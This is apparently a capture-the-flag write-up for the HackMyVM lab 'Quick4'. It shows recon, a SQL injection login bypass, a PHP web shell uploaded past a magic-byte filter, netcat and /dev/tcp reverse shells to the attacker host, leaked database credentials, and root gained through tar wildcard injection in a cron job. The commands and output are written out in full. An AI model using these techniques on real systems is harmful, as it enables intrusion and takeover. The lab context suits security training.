# Quick4

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.107:22
Open 10.0.2.107:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.107
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPw/57IwrzzYv7y9g3oCqiCqUmaOBmmLJyZE1iWqMH79gcziH5n9oWXErHh4nMVOw/99WYvN+v8vhFWfUK9pAsI=
|   256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHIfODTU2kHh2eDs9+Y+WWGaX2WZC5Vx/V4NY0LTBAs
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Quick Automative - Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/quick4/writeup.png)

Just like the previous box we can sign up on `/customer`, but no more IDOR.

![writeup-1.png](/assets/pentest/hackmyvm/quick4/writeup-1.png)

### SQLi (year)

`year` seems to be potentially vulnerable to SQLi
```bash
└─$ curl 'http://10.0.2.107/customer/submitcar.php' -d "license_plate=1a&brand=1b&type=1c&year='1900" -Li
HTTP/1.0 500 Internal Server Error
```

Nothing
```bash
└─$ sqlmap -u 'http://10.0.2.107/customer/submitcar.php' --data 'license_plate=1&brand=2&type=3&year=4' -p 'year' -b 'PHPSESSID=iev310ulobahi4vf3c0nkpap6n' --batch --second-url 'http://10.0.2.107/customer/cars.php' --dbms=MySQL --current-db --level 5 --risk 3
```

### Fuzzing

```bash
└─$ feroxbuster -u http://10.0.2.107 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET       23l       67w      696c http://10.0.2.107/.well-known/security.txt
301      GET        9l       28w      311c http://10.0.2.107/customer => http://10.0.2.107/customer/
200      GET        7l      158w     9028c http://10.0.2.107/lib/waypoints/waypoints.min.js
200      GET        7l     1022w    56879c http://10.0.2.107/lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js
200      GET        1l       38w     2302c http://10.0.2.107/lib/easing/easing.min.js
200      GET        1l     6490w   326657c http://10.0.2.107/lib/tempusdominus/js/moment.min.js
301      GET        9l       28w      311c http://10.0.2.107/employee => http://10.0.2.107/employee/
200      GET      110l      199w     2634c http://10.0.2.107/js/main.js
200      GET      804l     3568w    51414c http://10.0.2.107/index.html
200      GET        1l     1421w    32832c http://10.0.2.107/lib/tempusdominus/js/moment-timezone.min.js
301      GET        9l       28w      308c http://10.0.2.107/fonts => http://10.0.2.107/fonts/
200      GET        3l      148w     8156c http://10.0.2.107/lib/wow/wow.min.js
200      GET        7l      279w    42766c http://10.0.2.107/lib/owlcarousel/owl.carousel.min.js
200      GET       11l       56w     2406c http://10.0.2.107/lib/counterup/counterup.min.js
200      GET      804l     3568w    51414c http://10.0.2.107/
301      GET        9l       28w      309c http://10.0.2.107/images => http://10.0.2.107/images/
301      GET        9l       28w      306c http://10.0.2.107/img => http://10.0.2.107/img/
301      GET        9l       28w      310c http://10.0.2.107/careers => http://10.0.2.107/careers/
301      GET        9l       28w      305c http://10.0.2.107/js => http://10.0.2.107/js/
301      GET        9l       28w      306c http://10.0.2.107/lib => http://10.0.2.107/lib/
301      GET        9l       28w      310c http://10.0.2.107/modules => http://10.0.2.107/modules/
200      GET        2l        4w       32c http://10.0.2.107/robots.txt
```

### SQLi

There's another portal for employees at: [http://10.0.2.107/employee](http://10.0.2.107/employee)

By using basic SQLi payload in username we are able to login as Quick user
```bash
' OR 1=1 -- -
```

![writeup-2.png](/assets/pentest/hackmyvm/quick4/writeup-2.png)

### Upload Bypass

I first uploaded test file, it got uploaded but not sure where. Looking at admin picture it looks like `{ID}_{FILENAME}.{EXT}` format, if we try that for my image it works.

![writeup-3.png](/assets/pentest/hackmyvm/quick4/writeup-3.png)

`type` doesn't effect the upload form
```bash
└─$ curl 'http://10.0.2.107/employee/manageemployees.php' -F 'user_id=2' -F 'fileToUpload=@/opt/scripts/shells/p0wny-shell/shell.php; filename=shell.php; type=image/jpeg' -F 'submit=Upload Photo'
Invalid file type. Only JPEG, PNG, and GIF files are allowed.                                                                                                  
```

However magic bytes is enough to fool upload form
```bash
└─$ echo 'GIF89;<?php system($_REQUEST[0]) ?>' > shell.gif.php
└─$ curl 'http://10.0.2.107/employee/manageemployees.php' -F 'user_id=2' -F 'fileToUpload=@shell.gif.php; type=image/gif' -F 'submit=Upload Photo'
└─$ curl 'http://10.0.2.107/employee/uploads/2_shell.gif.php' -d '0=id'
GIF89;uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell

```bash
└─$ curl 'http://10.0.2.107/employee/uploads/2_shell.gif.php' --data-urlencode '0=busybox nc 10.0.2.15 4444 -e /bin/bash'
---
└─$ penelope -p 4444
www-data@quick4:/var/www/html/employee/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data
```

```bash
www-data@quick4:/var/www/html/employee$ cat config.php
<?php
$servername = "localhost";
$username = "root";
$password = "fastandquicktobefaster";
$dbname = "quick";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
    die("Connection failed: " . $mysqli->connect_error);
}
?>
```

## Privilege Escalation

```bash
www-data@quick4:/var/www/html/employee$ cat /etc/crontab  | grep -vE '^#|anacron'

SHELL=/bin/sh

*/1 *   * * *   root    /usr/local/bin/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

```bash
www-data@quick4:/var/www/html/employee$ ls -l /usr/local/bin/backup.sh
-rwxr--r-- 1 root root 75 Feb 12  2024 /usr/local/bin/backup.sh
www-data@quick4:/var/www/html/employee$ cat /usr/local/bin/backup.sh
#!/bin/bash
cd /var/www/html/
tar czf /var/backups/backup-website.tar.gz *
```

- [https://gtfobins.github.io/gtfobins/tar/#sudo](https://gtfobins.github.io/gtfobins/tar/#sudo)

```bash
www-data@quick4:/var/www/html$ echo $'#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4777 /tmp/rootbash' > /var/www/html/letmein.sh
www-data@quick4:/var/www/html$ chmod +x /var/www/html/letmein.sh
www-data@quick4:/var/www/html$ touch '/var/www/html/--checkpoint=1'
www-data@quick4:/var/www/html$ touch '/var/www/html/--checkpoint-action=exec=bash letmein.sh'
```

```bash
www-data@quick4:/var/www/html$ sleep 60
www-data@quick4:/var/www/html$ ls /tmp
# Empty
```

Changing the script to reverse shell worked
```bash
www-data@quick4:/var/www/html$ echo $'#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1' > /var/www/html/letmein.sh
```

Still not positive why, testing by myself and the rootbash got created. Weird flex.
```bash
└─$ listen
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.106:43032.
bash: cannot set terminal process group (2296758): Inappropriate ioctl for device
bash: no job control in this shell
root@quick4:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

## Flags

```bash
root@quick4:/var/www/html# cat /home/user.txt /root/root.txt | grep -o 'HMV{.*}'
HMV{7920c4596aad1b9826721f4cf7ca3bf0}
HMV{858d77929683357d07237ef3e3604597}
```